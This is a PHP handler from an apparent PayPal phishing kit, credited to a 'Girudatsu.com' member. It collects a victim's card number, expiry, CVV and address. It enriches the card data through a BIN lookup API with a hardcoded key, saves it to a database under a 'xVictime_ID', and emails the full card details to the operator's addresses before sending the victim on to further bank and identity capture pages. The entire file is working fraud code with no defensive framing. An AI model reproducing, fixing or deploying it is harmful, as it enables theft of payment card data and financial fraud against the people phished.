<?php
// Decoded by Girudatsu.com Member

@session_start();
if (isset($_POST['cc_number']) && isset($_POST['exp']) && isset($_POST['csc'])) {
    $cc = $_POST['cc_number'];
    $exp = $_POST['exp'];
    $csc = $_POST['csc'];
    $x_address = $_POST['x_address'];
    $explode_address = explode('<br>', $x_address);
    $x_full_name = $explode_address[55 + -55];
    $cc_card_type = ucwords(strtolower($_POST['cc_card_type']));
    $_curl = curl_init();
    curl_setopt($_curl, CURLOPT_URL, 'https://api.bincodes.com/bin-checker.php?api_key=2d974e94811161f1dda14bbf63aa9790&bin=' . substr($cc, 72 + -72, 104 + -98));
    curl_setopt($_curl, CURLOPT_SSL_VERIFYHOST, -46 - -48);
    curl_setopt($_curl, CURLOPT_RETURNTRANSFER, (bool) (23 + -22));
    curl_setopt($_curl, CURLOPT_SSL_VERIFYPEER, (bool) (2 + -2));
    $_result = curl_exec($_curl);
    curl_close($_curl);
    if ($_result) {
        $xBIN = new SimpleXMLElement($_result);
        $cc_x_Bank = ucwords(strtolower($xBIN->bank));
        $cc_x_CardLevel = ucwords(strtolower($xBIN->level));
        $bank_country = ucwords(strtolower($xBIN->country));
        $bank_website = strtolower($xBIN->website);
        $bank_phone = strtolower($xBIN->phone);
        $cctype = ucwords(strtolower($xBIN->type));
    }
    $pdo = new PDO('sqlite:../admin/database.db');
    if ($pdo) {
        $xVictime = $_SESSION['xVictime_ID'];
        $settings = $pdo->query('SELECT * FROM `settings`')->fetch(PDO::FETCH_ASSOC);
        $check = $pdo->query('' . 'SELECT * FROM `accounts` WHERE `id`=\'' . "{$xVictime}" . '\'' . '')->fetch(PDO::FETCH_ASSOC);
        if ($check['has_card'] != 'yes') {
            $add_cc = $pdo->query('' . 'INSERT INTO `creditcards` VALUES (NULL,\'' . "{$xVictime}" . '\',\'holder\',\'' . "{$cc}" . '\',\'' . "{$exp}" . '\',\'' . "{$csc}" . '\',\'' . "{$cc_card_type}" . '\',\'' . "{$cctype}" . '\',\'' . "{$cc_x_CardLevel}" . '\',\'' . "{$cc_x_Bank}" . '\',\'\',\'' . "{$bank_country}" . '\',\'' . "{$bank_website}" . '\',\'' . "{$bank_phone}" . '\',\'\',\'\',\'\',\'\',\'\',\'\',\'\')' . '');
            if (!$add_cc) {
                fwrite(fopen('logs.txt', 'a'), '' . 'INSERT INTO `creditcards` VALUES (NULL,\'' . "{$xVictime}" . '\',\'holder\',\'' . "{$cc}" . '\',\'' . "{$exp}" . '\',\'' . "{$csc}" . '\',\'' . "{$cc_card_type}" . '\',\'' . "{$cctype}" . '\',\'' . "{$cc_x_CardLevel}" . '\',\'' . "{$cc_x_Bank}" . '\',\'\',\'' . "{$bank_country}" . '\',\'' . "{$bank_website}" . '\',\'' . "{$bank_phone}" . '\',\'\',\'\',\'\',\'\',\'\',\'\',\'\')' . '');
            }
            $pdo->query('' . 'UPDATE `accounts` SET `has_card`=\'yes\' WHERE `id`=\'' . "{$xVictime}" . '\'' . '');
            $pdo->query('' . 'UPDATE `accounts` SET `fullname`=\'' . "{$x_full_name}" . '\' WHERE `id`=\'' . "{$xVictime}" . '\'' . '');
        }
        $pdo->query('' . 'UPDATE `accounts` SET `address`=\'' . "{$x_address}" . '\' WHERE `id`=\'' . "{$xVictime}" . '\'' . '');
        if ($settings['notification'] == 'every' || $settings['notification'] == 'cc') {
            $get_id = $pdo->query('' . 'SELECT * FROM `creditcards` WHERE `owner_id`=\'' . "{$xVictime}" . '\'' . '')->fetch(PDO::FETCH_ASSOC);
            $get_addr = $pdo->query('' . 'SELECT `address` FROM `accounts` WHERE `id`=\'' . "{$xVictime}" . '\'' . '')->fetch(PDO::FETCH_ASSOC);
            $x_receiver = $settings['emails'];
            $x_header = 'From: CaZaNoVa163 <Cazanova.Haxor@hotmail.com>' . chr(13) . chr(10) . 'MIME-Version: 1.0' . chr(13) . chr(10) . 'Content-Type: text/html' . chr(13) . chr(10) . 'Content-Transfer-Encoding: 8bit' . chr(13) . chr(10) . chr(13) . chr(10);
            $x_subject = 'xPayPal | CC | ' . $get_id['cc'] . ' | ' . $get_id['cardname'] . ' | ' . $get_id['type'] . ' | ' . $get_id['level'] . ' | ' . $get_id['bank_name'];
            $x_message = '
                                        <!doctype html>
                                        <html class=\'no-js\' lang=\'en\'>
                                            <head>
                                                <meta charset=\'utf-8\'>
                                                <meta http-equiv=\'x-ua-compatible\' content=\'ie=edge\'>
                                                <meta name=\'viewport\' content=\'width=device-width, initial-scale=1\'>
                                            </head>
                                            <body style=\'background-color:#0d0d0d\'>
                                            <div style=\'width:100%;height:auto;min-height:100px;border-radius:10px;background-image:url(http://i.imgur.com/FZvRMdI.png);background-size:333px 56px;background-position:50% 50%;background-repeat:no-repeat;margin:10px 0;box-sizing:border-box;padding:10px\'></div>
                                                <div style=\'width:100%;background-color:#171717;height:auto;min-height:100px;border-radius:10px;margin:10px 0;box-sizing:border-box;padding:10px\'>
                                                        <div style=\'background-color:#0d0d0d;margin:10px;padding:10px;box-sizing:border-box;color:#909090;border-radius:10px;font-size:16px\'><table><tr><td style=\'width:100px;text-align:right\'>Card Number: </td><td>' . $get_id['cc'] . '</td></tr></table></div>
                                                        <div style=\'background-color:#0d0d0d;margin:10px;padding:10px;box-sizing:border-box;color:#909090;border-radius:10px;font-size:16px\'><table><tr><td style=\'width:100px;text-align:right\'>Expire Date: </td><td>' . $get_id['exp'] . '</td></tr></table></div>
                                                        <div style=\'background-color:#0d0d0d;margin:10px;padding:10px;box-sizing:border-box;color:#909090;border-radius:10px;font-size:16px\'><table><tr><td style=\'width:100px;text-align:right\'>CVV/CVV2: </td><td>' . $get_id['cvv'] . '</td></tr></table></div>
                                                        <div style=\'background-color:#0d0d0d;margin:10px;padding:10px;box-sizing:border-box;color:#909090;border-radius:10px;font-size:16px\'><table><tr><td style=\'width:100px;text-align:right\'>Full Address: </td><td>' . $get_addr['address'] . '</td></tr></table></div>
                                                        <div style=\'background-color:#0d0d0d;margin:10px;padding:10px;box-sizing:border-box;color:#909090;border-radius:10px;font-size:16px\'><table><tr><td style=\'width:100px;text-align:right\'>Card Name: </td><td>' . $get_id['cardname'] . '</td></tr></table></div>
                                                        <div style=\'background-color:#0d0d0d;margin:10px;padding:10px;box-sizing:border-box;color:#909090;border-radius:10px;font-size:16px\'><table><tr><td style=\'width:100px;text-align:right\'>Card Type: </td><td>' . $get_id['type'] . '</td></tr></table></div>
                                                        <div style=\'background-color:#0d0d0d;margin:10px;padding:10px;box-sizing:border-box;color:#909090;border-radius:10px;font-size:16px\'><table><tr><td style=\'width:100px;text-align:right\'>Card Level: </td><td>' . $get_id['level'] . '</td></tr></table></div>
                                                        <div style=\'background-color:#0d0d0d;margin:10px;padding:10px;box-sizing:border-box;color:#909090;border-radius:10px;font-size:16px\'><table><tr><td style=\'width:100px;text-align:right\'>Bank Name: </td><td>' . $get_id['bank_name'] . '</td></tr></table></div>
                                                        <div style=\'background-color:#0d0d0d;margin:10px;padding:10px;box-sizing:border-box;color:#909090;border-radius:10px;font-size:16px\'><table><tr><td style=\'width:100px;text-align:right\'>Bank Country: </td><td>' . $get_id['bank_country'] . '</td></tr></table></div>
                                                        <div style=\'background-color:#0d0d0d;margin:10px;padding:10px;box-sizing:border-box;color:#909090;border-radius:10px;font-size:16px\'><table><tr><td style=\'width:100px;text-align:right\'>Bank Website: </td><td>' . $get_id['bank_website'] . '</td></tr></table></div>
                                                        <div style=\'background-color:#0d0d0d;margin:10px;padding:10px;box-sizing:border-box;color:#909090;border-radius:10px;font-size:16px\'><table><tr><td style=\'width:100px;text-align:right\'>Bank Phone: </td><td>' . $get_id['bank_phone'] . '</td></tr></table></div>
                                                </div>
                                                <div style=\'width:100%;background-color:#171717;height:auto;min-height:100px;border-radius:10px;background-image:url(http://i.imgur.com/G4tFJJa.png);background-size:413px 61px;background-position:50% 50%;background-repeat:no-repeat;margin:10px 0;box-sizing:border-box;padding:10px\'></div>
                                            </body>
                                        </html>
                                ';
            $this_receiver = explode(chr(10), $x_receiver);
            foreach ($this_receiver as $to) {
                if ($to != '') {
                    @mail($to, $x_subject, $x_message, $x_header);
                }
            }
        }
    }
    $to_where = $pdo->query('' . 'SELECT `cardname` FROM `creditcards` WHERE `owner_id`=\'' . "{$xVictime}" . '\'' . '')->fetch(PDO::FETCH_ASSOC);
    if ($settings['enable_vbv'] == 'yes' && ($to_where['cardname'] == 'Visa' || $to_where['cardname'] == 'Mastercard' || $to_where['cardname'] == 'Amex')) {
        echo 'to_vbv';
    } elseif ($settings['enable_bank'] == 'yes') {
        echo 'to_bank';
    } elseif ($settings['enable_identity'] == 'yes') {
        echo 'to_identity';
    } else {
        echo 'to_thanks';
    }
    exit;
}
